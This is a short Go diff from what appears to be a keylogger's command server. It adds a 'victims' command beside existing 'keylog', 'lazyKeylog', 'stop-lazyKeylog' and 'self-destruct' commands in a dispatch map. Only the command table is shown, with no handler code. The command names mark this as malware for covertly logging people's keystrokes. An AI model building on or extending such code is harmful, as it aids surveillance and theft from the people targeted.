@@ -21,6 +21,7 @@ var commands = map[string]func(command *models.Command, repo *repo.AliasRepo) er
 	"stop-lazyKeylog": service.ExecuteStopCommand,
 	"self-destruct":   service.ExecuteSelfDestruct,
 	"keylog":          service.ExecuteTextFileCommand,
+	"victims":         service.ExecuteGetVictims,
 	"lazyKeylog":      service.ExecuteTextFileCommand,
 }
 
